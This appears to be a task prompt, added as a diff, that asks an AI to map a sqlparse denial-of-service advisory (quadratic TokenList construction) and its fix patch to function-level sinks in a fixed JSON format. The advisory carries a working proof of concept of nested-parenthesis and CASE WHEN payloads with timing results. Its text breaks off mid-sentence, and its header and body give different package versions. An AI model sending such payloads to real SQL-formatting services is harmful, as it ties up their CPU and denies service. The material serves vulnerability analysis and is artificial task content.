@@ -1,0 +1,157 @@
+You convert advisory prose into function-level sinks for a static reachability analyser.
+
+Mode: advisory+patch
+You get the advisory text and the Python hunks of the linked fix commit below.
+
+Advisory GHSA-pwgv-4x5q-6m9f (CVE-2026-54284)
+Package: sqlparse 0.4.4
+Fixed in: 0.6.0
+Severity: high
+
+Summary: sqlparse: TokenList.__init__ materializes O(subtree) value per group, causing CPU DoS before depth/token caps trigger
+
+Details:
+### Summary
+
+`sqlparse` ships hard limits (`MAX_GROUPING_DEPTH=100`, `MAX_GROUPING_TOKENS=10000`) intended to bound parsing work on attacker-supplied SQL, but the path that *reaches* those limits is itself `O(n*depth)` per token-group construction. A ~1-2 KB SQL payload (e.g. `SELECT (((((1))))) ...` with 500-2000 nesting levels, or a 200-400-level nested `CASE WHEN` chain) drives the parser to spend multiple seconds of CPU before the depth cap raises `SQLParseError`. Concretely: a 2 KB malicious payload consumes ~10 seconds of CPU per request on a single worker (~5000x CPU-to-input amplification), while a benign 1 KB SQL completes in ~3 ms.
+
+The root cause is `TokenList.__init__` calling `super().__init__(None, str(self))`. `TokenList.__str__` flattens the entire subtree on every call, and grouping constructs a new `TokenList` for every parenthesis / CASE / list group, so a tree of depth `d` with `n` total tokens performs `O(n*d)` flatten work just to materialize the cached `value` field, which is then never read for grouped nodes (they override `__str__`).
+
+This is a distinct quadratic from the input-size caps added in GHSA-2m57-hf25-phgg / GHSA-27jp-wm6q-gp25: those caps prevent unbounded work, but the time required to *trigger* the caps is itself superlinear in payload size.
+
+### Affected components
+
+`sqlparse` 0.5.5 (latest) and every prior version that ships `TokenList.__init__`. The offending line has existed since the introduction of the cached-value invariant; the recent DoS-protection commit (`da67ac1`, 2025-12-08) added depth + token caps to `_group_matching` / `_group` but left the per-node `str(self)` materialization untouched.
+
+### Vulnerable code (file:line)
+
+[`sqlparse/sql.py#L162`](https://github.com/andialbrecht/sqlparse/blob/0.5.5/sqlparse/sql.py#L162) (release 0.5.5) / [`sqlparse/sql.py#L167`](https://github.com/andialbrecht/sqlparse/blob/c923da9c5a8e8403dd32efc2171b60a177444d43/sqlparse/sql.py#L167) (current `master`):
+
+```python
+class TokenList(Token):
+    __slots__ = 'tokens'
+
+    def __init__(self, tokens=None):
+        self.tokens = tokens or []
+        [setattr(token, 'parent', self) for token in self.tokens]
+        super().__init__(None, str(self))   # ← O(subtree) work per group
+        self.is_group = True
+
+    def __str__(self):
+        return ''.join(token.value for token in self.flatten())
+```
+
+`__str__` recurses via `flatten()` over the *entire* subtree below `self`. Every `TokenList` constructed during grouping (every `Parenthesis`, `Case`, `IdentifierList`, etc.) runs this on its current children, which themselves recursively call `flatten()`. For grouping that builds a tree of depth `d` containing `n` tokens, the construction cost is `O(n * d)`.
+
+The grouping pipeline that triggers it lives at [`sqlparse/engine/grouping.py#L80`](https://github.com/andialbrecht/sqlparse/blob/0.5.5/sqlparse/engine/grouping.py#L80) (`group_parenthesis`) and [`sqlparse/engine/grouping.py#L84`](https://github.com/andialbrecht/sqlparse/blob/0.5.5/sqlparse/engine/grouping.py#L84) (`group_case`). Both call `_group_matching` which builds nested `Parenthesis` / `Case` `TokenList` instances bottom-up.
+
+### Reachable / How input reaches the sink
+
+`sqlparse.parse(sql)`, `sqlparse.format(sql, reindent=True)`, and `sqlparse.split(sql)` are the documented entry points and all flow into `engine/filter_stack.py:run` → `engine/grouping.py:group` → `group_parenthesis` / `group_case`. There is no opt-in flag: the quadratic runs on default configuration whenever attacker-controlled SQL contains nested parentheses, nested `CASE WHEN`, nested subqueries, or nested `ARRAY[]` literals.
+
+Real-world consumers that feed user input directly into these entry points include any SQL formatter web service (the `sqlformat.org`-style class of tools), Django's `format_debug_sql` (`django/db/backends/base/operations.py`) used when a debug toolbar shows user-typed SQL, and downstream metadata libraries such as `sql-metadata` (`Parser(sql).columns` triggers the same O(n*d) path and reproduces the multi-second hang on the same inputs).
+
+### Proof of concept
+
+Minimal in-process reproduction (sqlparse 0.5.5, default settings, no caps overridden):
+
+```python
+import sqlparse, time, signal
+
+def _h(s, f): raise TimeoutError()
+signal.signal(signal.SIGALRM, _h)
+
+def measure(label, sql, fn):
+    signal.alarm(30)
+    t0 = time.perf_counter()
+    status = 'OK'
+    try:
+        fn(sql)
+    except sqlparse.exceptions.SQLParseError:
+        status = 'CAP'
+    except TimeoutError:
+        status = 'TIMEOUT'
+    finally:
+        signal.alarm(0)
+    dt = (time.perf_counter() - t0) * 1000
+    print(f'  {status:8} {dt:8.1f}ms  {label}  ({len(sql)} B)')
+
+# Vector 1: deeply nested parentheses
+for n in (200, 500, 1000, 2000):
+    sql = 'SELECT ' + '(' * n + '1' + ')' * n
+    measure(f'nested-paren n={n}', sql, sqlparse.parse)
+
+# Vector 2: deeply nested CASE WHEN
+for n in (100, 200, 400):
+    case = '1'
+    for i in range(n):
+        case = f'CASE WHEN x={i} THEN {case} ELSE NULL END'
+    measure(f'CASE-nested n={n}', f'SELECT {case} FROM t', sqlparse.parse)
+```
+
+Output on the reporter's machine (Python 3.9, sqlparse 0.5.5, single core):
+
+```
+  CAP         80.7ms  nested-paren n=200  (408 B)
+  CAP       1342.9ms  nested-paren n=500  (1008 B)
+  CAP      11206.9ms  nested-paren n=1000  (2008 B)
+  TIMEOUT  >10000ms   nested-paren n=2000  (4008 B)
+  CAP         83.1ms  CASE-nested n=100  (3405 B)
+  CAP        559.6ms  CASE-nested n=200  (6905 B)
+  CAP       5012.2ms  CASE-nested n=400  (13905 B)
+```
+
+`cProfile` attribution (nested-paren n=500, 1008 B input, 3.1 s total):
+
+```
+ncalls   cumtime  filename:lineno(function)
+   501    3.133   sqlparse/sql.py:165(__str__)
+   501    3.127   {method 'join' of 'str' objects}
+252504    3.110   sqlparse/sql.py:166(<genexpr>)
+42168504 3.079   sqlparse/sql.py:207(flatten)
+```
+
+42 million `flatten()` calls for a 1 KB input. The cap raises at depth 100, but `TokenList.__init__` ran `str(self)` once p
+
+References:
+- WEB: https://github.com/andialbrecht/sqlparse/security/advisories/GHSA-pwgv-4x5q-6m9f
+- WEB: https://github.com/andialbrecht/sqlparse/commit/939b129e24c0ad5d51368b1aa72fffcaca76f06f
+- PACKAGE: https://github.com/andialbrecht/sqlparse
+
+Fix commit, Python hunks only:
+--- https://github.com/andialbrecht/sqlparse/commit/939b129e24c0ad5d51368b1aa72fffcaca76f06f.patch ---
+diff --git a/sqlparse/sql.py b/sqlparse/sql.py
+index 6b21859b..5489f055 100644
+--- a/sqlparse/sql.py
++++ b/sqlparse/sql.py
+@@ -164,7 +164,7 @@ class TokenList(Token):
+     def __init__(self, tokens=None):
+         self.tokens = tokens or []
+         [setattr(token, 'parent', self) for token in self.tokens]
+-        super().__init__(None, str(self))
++        super().__init__(None, ''.join(token.value for token in self.tokens))
+         self.is_group = True
+ 
+     def __str__(self):
+@@ -327,7 +327,7 @@ def group_tokens(self, grp_cls, start, end, include_end=True,
+             grp = start
+             grp.tokens.extend(subtokens)
+             del self.tokens[start_idx + 1:end_idx]
+-            grp.value = str(start)
++            grp.value += ''.join(token.value for token in subtokens)
+         else:
+             subtokens = self.tokens[start_idx:end_idx]
+             grp = grp_cls(subtokens)
+
+
+Return exactly this JSON object and nothing else:
+
+{"advisory": "GHSA-pwgv-4x5q-6m9f", "package": "sqlparse", "sinks": ["pkg.module.Class.method"],
+ "confidence": "high|medium|low", "evidence": "...", "assumptions": ["..."], "mode": "advisory+patch"}
+
+Rules:
+- Fully qualified identifiers only. A bare function name is not an answer.
+- Name the function that contains the flaw, not the public API a user calls, unless they are the same.
+- sinks may be empty. An empty list with an honest assumption beats a guess.
+- confidence is high only when the advisory or the patch names the function.
+- Put every inference that could be wrong in assumptions. A verifier checks them against the patch diff.
